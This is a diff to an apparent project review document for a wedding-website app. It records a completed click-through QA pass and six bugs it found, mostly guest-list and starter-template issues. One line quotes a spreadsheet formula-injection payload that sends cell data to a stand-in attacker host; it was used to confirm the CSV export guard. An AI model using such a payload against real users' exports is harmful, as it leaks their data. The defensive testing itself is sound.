@@ -217,15 +217,64 @@ past weddings, missing and corrupt dates, and that `laterOf` never shortens.
 No `favicon.ico`, `icon.tsx`, or `icon.png`. Every browser tab — including the
 couple's published wedding site — shows the default globe.
 
-### 7. Nothing behind auth has been visually verified
-The entire design overhaul (11 commits) is typechecked, built and colour-measured
-but **never opened**. Highest-risk screens, because they are dense and changed
-most:
-- **Guest list** — the invite matrix moved to a new status scale; labels went to
-  12px inside a fixed-width grid (a 56px side column) where wrapping is plausible
-- **Website editor** — dock panels now share the right rail with the section
-  inspector; the "inspector steps aside" behaviour has never been observed
-- **Settings → Connections**, the three merged tab bars, the seeded Templates gallery
+### 7. Nothing behind auth has been visually verified — DONE 2026-08-02
+The entire design overhaul was typechecked, built and colour-measured but never
+opened. It has now been walked end to end.
+
+**How.** A throwaway account (`zz-clickthrough@simvites.test`) signed in via a
+magic link minted with the admin API — no password typed into any form — then
+onboarding → guest list → invite matrix → editor → publish. The account, its
+org and every row it created were deleted afterwards; the temporary sign-in
+route was removed and the working tree verified clean.
+
+**What held up.** Onboarding creates the site and lands on a good empty-state
+dashboard. Adding a household and a guest works, and the household-level matrix
+toggle correctly invited all three guests to Mehndi (`3/3`). Editor autosave
+persists to `puck_data`. **The paywall holds** — Publish shows "Unlock to
+publish →" and the site stayed `draft`. No console errors on any screen. The M3
+CSV guard was confirmed *in the live app*: a guest named
+`=HYPERLINK("https://evil.tld?d="&A1,"Click me")` exported as `"'=HYPERLINK(…)"`,
+defused.
+
+Six things it found — none blocking, the first worth fixing before launch:
+
+**C1 (high). The starter site ships another couple's family.** A brand-new site
+titled "Priya & Sam" opens with a FAMILIES block reading *The Groom: Dev, Son of
+Anil & Meera* / *The Bride: Aanya, Daughter of Raj & Priya*, plus a hero dated
+*19 September 2026, Manchester UK* — the demo wedding, hardcoded in
+`lib/templates/registry.ts:143,146,152`. The hero *title* is substituted from
+the site name, so the couple sees "Priya & Sam" above someone else's parents,
+and a fabricated date contradicting their own schedule ("DATE TBC"). Partial
+substitution is what makes it read as a bug rather than as placeholder text, and
+it is the first screen a paying customer sees.
+
+**C2 (medium). No duplicate detection on the guest list.** The same person added
+twice — same name, email differing only in case — creates two guests with no
+warning ("2 guests · 2 emails"). Emails are stored as typed
+(`Chidi.Okonkwo@Example.COM`), so `sendInvitation`'s `[...new Set(emails)]`
+dedupe is case-sensitive and would mail them twice. Duplicates are the single
+most common guest-list data problem, and they inflate the catering numbers.
+
+**C3 (medium). The web address is silently rewritten.** Typing
+`Priya and Sam!! 2027` yields `priya-and-sam-2027` with no live preview and no
+confirmation. Couples print this address.
+
+**C4 (low).** The address does not derive from the couple's name; leaving it
+blank gives a browser "Please fill in this field" rather than a default.
+
+**C5 (low).** "1 HOUSEHOLDS · 1 GUESTS" — unpluralised counts.
+
+**C6 (low).** Selecting the Families block exposes only its heading; the names
+sit in a nested array field, so C1 is not only wrong but awkward to correct.
+
+**Not a finding, recorded so it is not re-investigated:** an admin-generated
+magic link lands on `/login?error=auth`, because `generateLink` uses the
+implicit flow and puts tokens in the URL fragment, which never reaches the
+server. Real users are unaffected — `createBrowserClient` uses PKCE, so their
+link carries `?code=` and `/auth/callback` handles it. **Worth testing by hand:**
+PKCE stores the verifier in the requesting browser, so requesting a link on a
+laptop and opening it on a phone should be expected to fail. That is a common
+thing for people to do.
 
 ---
 
@@ -354,8 +403,8 @@ lives only in the database.
    questions, then flip `LEGAL_REVIEWED`
 4. ~~The 18-month hosting claim (#5a)~~ **done** — the code now delivers what the
    pricing page promises, and existing sites were backfilled
-5. **Click-through of guest list + editor** (#7) — the only way to find what
-   review cannot
+5. ~~Click-through of guest list + editor (#7)~~ **done** — found C1–C6; **C1
+   (starter site shows the demo couple's family) is worth fixing before launch**
 6. ~~Favicon (#6), guest error page (#10), block tombstone (#10a)~~ **done** — **robots decision (#12)** remains
 7. ~~Fix lint, add it to CI (#8); wire the test suites into CI (#9)~~ **done** —
    the integration job needs `TEST_SUPABASE_*` repo secrets to actually run
